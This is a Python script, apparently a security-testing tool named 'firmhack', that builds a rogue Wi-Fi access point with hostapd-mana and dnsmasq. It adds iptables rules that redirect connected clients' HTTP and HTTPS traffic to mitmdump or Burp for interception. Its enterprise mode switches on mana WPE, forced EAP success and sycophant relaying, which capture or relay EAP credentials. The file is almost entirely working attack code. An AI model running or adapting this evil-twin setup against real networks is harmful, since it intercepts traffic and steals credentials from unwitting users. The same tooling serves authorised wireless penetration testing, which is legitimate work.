import json
import subprocess
import logging
import os


logger = logging.getLogger(__name__)

certs_and_keys = {
    "server.key": "openssl genrsa -out server.key 2048",
    "csr.csr": "openssl req -new -sha256 -key server.key -out csr.csr",
    "server.pem": "openssl req -x509 -sha256 -days 365 -key server.key -in csr.csr -out server.pem",
    "dhparam.pem": "openssl dhparam 2048 > dhparam.pem",
    "ca.pem": "ln -s server.pem ca.pem"
}


class HostapdManaNetworkType:
    NORMAL: int = 0
    ENTERPRISE: int = 1


class GeneralConfig:
    hostapdmanacmd: str = "hostapd-mana"
    dnsmasqcmd: str = "dnsmasq"
    mitmdumpcmd: str = "mitmdump"
    nm: bool = True
    inetinterface: str = ""


class APConfig:
    interface: str = "wlan0"
    loud: bool = True
    nettype: HostapdManaNetworkType = HostapdManaNetworkType.NORMAL
    name: str = "My WiFi"
    password: str = "mypasswd"


class ProxyConfig:
    logfile: str = "firmhack.log"
    burp: int = 0
    hosts: str = "^(?!example\\.com:)"


class AddressConfig:
    address: str = "https://example.com"
    file: str = "example/browser-detect.html"
    headers: dict = {}


class Config:
    general: GeneralConfig = GeneralConfig()
    ap: APConfig = APConfig()
    proxy: ProxyConfig = ProxyConfig()
    addresses: list[AddressConfig] = [AddressConfig()]


def get_hostapd_mana_type(type: str) -> HostapdManaNetworkType:
    return HostapdManaNetworkType.ENTERPRISE if type == "enterprise" else HostapdManaNetworkType.NORMAL


def form_hostapd_mana_config(interace: str, loud: bool, type: HostapdManaNetworkType, name: str, password: str) -> str:
    config = f"""# generated by firmhack
interface={interace}
ssid={name}
channel=6
hw_mode=g
"""
    if type == HostapdManaNetworkType.ENTERPRISE:
        # TODO: enterprise networks support
        config += f"""ieee8021x=1
wpa=2
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
mana_wpe=1
mana_eapsuccess=1
mana_eaptls=1
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=firmhack.eap_user
ca_cert=ca.pem
server_cert=server.pem
private_key=server.key
private_key_passwd=
dh_file=dhparam.pem
enable_sycophant=1
sycophant_dir=/tmp/"""
    if password and type != HostapdManaNetworkType.ENTERPRISE:
        config += f"""ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
wpa_passphrase={password}
auth_algs=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
"""
    return config


def form_hostapd_mana_userfile() -> str:
    return """*               PEAP,TTLS,TLS,MD5,GTC
\"t\"             TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  \"1234test\"  [2]"""


def get_config() -> dict:
    f = open("firmhack.json")
    config = json.loads(f.read())
    f.close()
    return config


def dict_to_obj_config(dict_config: dict) -> Config:
    general_config = GeneralConfig()
    general_config.hostapdmanacmd = dict_config["general"]["hostapdmanacmd"]
    general_config.dnsmasqcmd = dict_config["general"]["dnsmasqcmd"]
    general_config.mitmdumpcmd = dict_config["general"]["mitmdumpcmd"]
    general_config.nm = dict_config["general"]["nm"]
    general_config.inetinterface = dict_config["general"]["inetinterface"]

    ap_config = APConfig()
    ap_config.interface = dict_config["ap"]["interface"]
    ap_config.loud = dict_config["ap"]["loud"]
    ap_config.nettype = get_hostapd_mana_type(dict_config["ap"]["type"])
    ap_config.name = dict_config["ap"]["name"]
    ap_config.password = dict_config["ap"]["password"]

    proxy_config = ProxyConfig()
    proxy_config.logfile = dict_config["proxy"]["logfile"]
    proxy_config.burp = dict_config["proxy"]["burp"]
    proxy_config.hosts = dict_config["proxy"]["hosts"]

    addresses_config: list[AddressConfig] = []
    for address in dict_config["addresses"]:
        address_config = AddressConfig()
        address_config.address = address["address"]
        address_config.file = address["file"]
        address_config.headers = address["headers"]
        addresses_config.append(address_config)

    config = Config()
    config.general = general_config
    config.ap = ap_config
    config.proxy = proxy_config
    config.addresses = addresses_config
    return config


def form_dnsmasq_config(interface: str) -> str:
    return f"""interface={interface}
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
listen-address=127.0.0.1"""


def reset_console() -> None:
    subprocess.run(["stty", "sane"])


def main() -> None:
    logging.basicConfig(filename="firmhack.log",
                        level=logging.INFO, filemode="w")
    dict_config = get_config()
    config = dict_to_obj_config(dict_config)
    logger.info("Config seems to be valid!")
    if config.ap.nettype == HostapdManaNetworkType.ENTERPRISE:
        for k, v in certs_and_keys.items():
            if not os.path.exists(k):
                os.system(v)
                logger.info("""Generated {k}!""")
    hostapd_mana_config = form_hostapd_mana_config(
        config.ap.interface, config.ap.loud, config.ap.nettype, config.ap.name, config.ap.password)
    logger.info("Generated hostapd-mana config!")
    hostapd_mana_config_f = open("hostapd.conf", "w")
    hostapd_mana_config_f.write(hostapd_mana_config)
    hostapd_mana_config_f.close()
    logger.info("Saved hostapd-mana config!")
    hostapd_mana_userfile = form_hostapd_mana_userfile()
    logger.info("Generated hostapd-mana userfile!")
    hostapd_mana_userfile_f = open("firmhack.eap_user", "w")
    hostapd_mana_userfile_f.write(hostapd_mana_userfile)
    hostapd_mana_userfile_f.close()
    logger.info("Saved hostapd-mana userfile!")
    dnsmasq_config = form_dnsmasq_config(config.ap.interface)
    logger.info("Generated dnsmasq config!")
    dnsmasq_config_f = open("dnsmasq.conf", "w")
    dnsmasq_config_f.write(dnsmasq_config)
    dnsmasq_config_f.close()
    logger.info("Saved dnsmasq config!")
    if config.general.nm:
        logger.info("Disabling NetworkManager...")
        subprocess.run(["sudo", "nmcli", "radio", "wifi", "off"])
        reset_console()
    mitmdump = None
    mitmfile = None
    if not config.proxy.burp:
        logger.info("Starting mitmdump...")
        mitmfile = open(config.proxy.logfile, "w")
        mitmdump = subprocess.Popen(
            [config.general.mitmdumpcmd, "-s", "proxy.py", "-p", "1337", "--ignore-hosts", config.proxy.hosts], stdout=mitmfile, stderr=mitmfile)
    reset_console()
    logger.info("Setting things up before starting the AP...")
    subprocess.Popen(["sudo", "killall", "dnsmasq"]).wait()
    dnsmasq = subprocess.Popen(
        ["sudo", config.general.dnsmasqcmd, "-C", "dnsmasq.conf", "-d"])
    subprocess.run(["sudo", "ifconfig", config.ap.interface,
                   "10.0.0.1", "netmask", "255.255.255.0", "up"])
    if config.general.inetinterface:
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
                       "-o", config.general.inetinterface, "-j", "MASQUERADE"])
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i",
                       config.ap.interface, "-o", config.general.inetinterface, "-j", "ACCEPT"])
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", config.general.inetinterface, "-o",
                       config.ap.interface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", config.ap.interface,
                       "-p", "tcp", "-m", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(config.proxy.burp) if config.proxy.burp else "1337"])
        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", config.ap.interface,
                       "-p", "tcp", "-m", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", str(config.proxy.burp) if config.proxy.burp else "1337"])
    reset_console()
    logger.info("Starting hostapd-mana...")
    hostapd = subprocess.Popen(
        ["sudo", config.general.hostapdmanacmd, "hostapd.conf"])
    reset_console()
    try:
        hostapd.wait()
    except KeyboardInterrupt:
        pass
    logger.info("Shutting down...")
    if config.general.inetinterface:
        subprocess.run(["sudo", "iptables", "-F"])
    dnsmasq.terminate()
    if mitmdump is not None:
        mitmdump.terminate()
    if mitmfile is not None:
        mitmfile.close()
    if config.general.nm:
        logger.info("hostapd-mana has stopped. Enabling NetworkManager...")
        subprocess.run(["sudo", "nmcli", "radio", "wifi", "on"])
    reset_console()


if __name__ == "__main__":
    main()
